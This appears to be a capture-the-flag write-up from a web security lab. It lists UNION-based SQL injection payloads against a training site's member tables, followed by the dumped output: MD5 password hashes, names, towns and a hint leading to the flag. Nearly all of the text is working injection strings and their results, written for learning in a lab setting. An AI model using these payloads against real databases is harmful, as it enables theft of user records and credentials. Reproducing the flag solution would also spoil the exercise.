## Member_Brute_Force.db_default
1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default
ID: 1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default 
Title: 3bf1114a986ba87ed28fc1b5884fc2f8
Url : root

ID: 1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default 
Title: 3bf1114a986ba87ed28fc1b5884fc2f8
Url : admin


## Member_Sql_Injection.users
### first_name, last_name
1 and 1=1 UNION SELECT first_name, last_name from Member_Sql_Injection.users
ID: 1 and 1=1 UNION SELECT first_name, last_name from Member_Sql_Injection.users 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 1 and 1=1 UNION SELECT first_name, last_name from Member_Sql_Injection.users 
Title: me
Url : one

ID: 1 and 1=1 UNION SELECT first_name, last_name from Member_Sql_Injection.users 
Title: me
Url : two

ID: 1 and 1=1 UNION SELECT first_name, last_name from Member_Sql_Injection.users 
Title: me
Url : three

ID: 1 and 1=1 UNION SELECT first_name, last_name from Member_Sql_Injection.users 
Title: GetThe
Url : Flag

###  user_id, countersign
1 and 1=1 UNION SELECT user_id, countersign from Member_Sql_Injection.users
ID: 1 and 1=1 UNION SELECT user_id, countersign from Member_Sql_Injection.users 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 1 and 1=1 UNION SELECT user_id, countersign from Member_Sql_Injection.users 
Title: 2b3366bcfd44f540e630d4dc2b9b06d9
Url : 1

ID: 1 and 1=1 UNION SELECT user_id, countersign from Member_Sql_Injection.users 
Title: 60e9032c586fb422e2c16dee6286cf10
Url : 2

ID: 1 and 1=1 UNION SELECT user_id, countersign from Member_Sql_Injection.users 
Title: e083b24a01c483437bcf4a9eea7c1b4d
Url : 3

ID: 1 and 1=1 UNION SELECT user_id, countersign from Member_Sql_Injection.users 
Title: 5ff9d0165b4f92b14994e5c685cdce28
Url : 5

### town, country
1 and 1=1 UNION SELECT town, country from Member_Sql_Injection.users
ID: 1 and 1=1 UNION SELECT town, country from Member_Sql_Injection.users 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 1 and 1=1 UNION SELECT town, country from Member_Sql_Injection.users 
Title: France
Url : Paris 

ID: 1 and 1=1 UNION SELECT town, country from Member_Sql_Injection.users 
Title: Finlande
Url : Helsinki

ID: 1 and 1=1 UNION SELECT town, country from Member_Sql_Injection.users 
Title: Irlande
Url : Dublin

ID: 1 and 1=1 UNION SELECT town, country from Member_Sql_Injection.users 
Title: 42
Url : 42

### planet, Commentaire
1 and 1=1 UNION SELECT planet, Commentaire from Member_Sql_Injection.users
ID: 1 and 1=1 UNION SELECT planet, Commentaire from Member_Sql_Injection.users 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 1 and 1=1 UNION SELECT planet, Commentaire from Member_Sql_Injection.users 
Title: Je pense, donc je suis
Url : EARTH

ID: 1 and 1=1 UNION SELECT planet, Commentaire from Member_Sql_Injection.users 
Title: Aamu on iltaa viisaampi.
Url : Earth

ID: 1 and 1=1 UNION SELECT planet, Commentaire from Member_Sql_Injection.users 
Title: Dublin is a city of stories and secrets.
Url : Earth

ID: 1 and 1=1 UNION SELECT planet, Commentaire from Member_Sql_Injection.users 
Title: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Url : 42



#### for user id 5
we have the following countersign:
5ff9d0165b4f92b14994e5c685cdce28
if decrypt countersign with md5, it gives:
FortyTwo


